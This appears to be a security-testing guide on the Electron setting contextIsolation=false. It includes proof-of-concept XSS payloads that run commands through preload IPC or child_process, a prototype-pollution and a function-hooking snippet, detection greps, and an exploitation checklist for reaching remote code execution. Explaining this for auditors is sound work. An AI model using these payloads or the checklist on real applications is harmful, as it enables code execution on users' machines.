---
title: contextIsolation=false
description: The dangers of disabling context isolation — what attackers can do when JS worlds merge
---

# contextIsolation=false

Context isolation is the fundamental security boundary between the preload script and the web page. When it's on, the preload's internal variables are invisible to the page — the page can only access what the preload explicitly puts on `window` via `contextBridge`. When it's off, that boundary disappears.

With `contextIsolation: false`, any XSS payload can directly call everything the preload script defined. Not just what it exported — everything it had access to. The entire bridge between renderer and main process becomes the attacker's bridge too.

---

## What Merging the Worlds Means

With isolation on, there are two separate V8 contexts:

```
World 999 (preload):
  const ipc = require('electron').ipcRenderer;
  // ipc exists here, invisible to World 0
  
  contextBridge.exposeInMainWorld('api', {
    doThing: () => ipc.invoke('safe-channel')  // explicitly exported
  });

World 0 (page):
  window.api.doThing()   // works — explicitly exported
  window.ipc.invoke()    // fails — ipc was never exported
```

With isolation off, there's one context. The preload runs first, populates `window`, and when the page loads its JS, every variable the preload put on `window` is already there:

```
Merged world:
  const ipc = require('electron').ipcRenderer;
  window.myApp = { runCommand: (cmd) => ipc.invoke('run-cmd', cmd) };
  
  // Page JS (or XSS) can now:
  window.myApp.runCommand('calc.exe');  // → IPC → exec → RCE
  
  // And if the preload created ipcRenderer with any name:
  // (depends on exactly how the preload was written, but often:)
  window._electron.ipcRenderer.invoke('any-channel', 'payload');
```

---

## Exploitation Scenarios

### Scenario 1: Direct Preload API Access

The most common case — the preload exposes some dangerous function and XSS calls it directly:

```javascript
// preload.js (contextIsolation: false):
const { ipcRenderer } = require('electron');
window.myApp = {
  openFile: () => ipcRenderer.invoke('dialog:open'),
  runCommand: (cmd) => ipcRenderer.invoke('run-cmd', cmd)
  // runCommand was meant for internal use only — but with isolation off,
  // the page can call it too
};

// XSS in page:
window.myApp.runCommand('calc.exe');
```

If there's also `nodeIntegration: true` on top of this, you skip the IPC step entirely:

```javascript
// XSS with nodeIntegration:true + contextIsolation:false:
require('child_process').exec('calc.exe');
```

### Scenario 2: Prototype Pollution Across Contexts

Shared worlds mean shared prototype chains. The page and the preload use the *same* `Object.prototype`. Poison it from the page and it affects the preload's code too:

```javascript
// XSS payload:
Object.prototype.type = 'exploit';
Object.prototype.command = 'calc.exe';

// If somewhere in the preload:
function handleRequest(request) {
  if (request.type === 'safe') {  // request = {} → request.type = 'exploit' (from prototype)
    exec(request.command);        // exec('calc.exe')
  }
}
handleRequest({});  // empty object, but prototype has 'type' and 'command'
```

### Scenario 3: Function Prototype Interception

The merged context lets an attacker monkey-patch JavaScript builtins and intercept calls made by the preload:

```javascript
// XSS payload:
const original = Function.prototype.apply;
Function.prototype.apply = function(thisArg, args) {
  // Log every function call made in the preload context:
  exfiltrate(this.name, args);
  return original.apply(this, [thisArg, args]);
};

// Now all preload function calls are visible — useful for discovering
// what arguments are passed to IPC handlers
```

---

## How to Detect It

```bash
# Explicit contextIsolation: false:
grep -rn "contextIsolation.*false\|contextIsolation:false" --include="*.js" .

# Missing contextIsolation (pre-Electron-12 apps that never set it):
grep -rn "new BrowserWindow" --include="*.js" . -A 20 | grep -v node_modules | \
  grep -B 5 "webPreferences" | grep -v "contextIsolation"

# Check the Electron version — if < 12, missing contextIsolation = false:
cat package.json | grep '"electron"'
```

---

## Electron Version Defaults

| Electron version | contextIsolation default |
|-----------------|------------------------|
| < 12.0 | `false` — vulnerable |
| ≥ 12.0 | `true` — secure |

Apps built on older Electron that never explicitly set `contextIsolation: true` are vulnerable by default. This is more common than you'd expect — many apps bump Electron versions for dependency updates without reviewing what the new defaults mean or checking whether existing settings override the safe defaults.

---

## Exploitation Checklist

1. Confirm `contextIsolation: false` — grep or check BrowserWindow config
2. Read the preload script — catalog everything it puts on `window`
3. Find any XSS in the renderer — the threshold for "exploitable" just dropped to zero
4. Use XSS to call preload APIs directly — no contextBridge export required
5. Trace from those APIs to exec/spawn/shell.openExternal in the ipcMain handlers
6. Check if `nodeIntegration: true` is also set — if so, skip the IPC step and call `require('child_process')` directly from XSS

Finding `contextIsolation: false` combined with any DOM XSS is a Critical finding on its own. The chain to RCE depends on what the preload exposes, but even if the preload is minimal, the prototype pollution vector is still there.
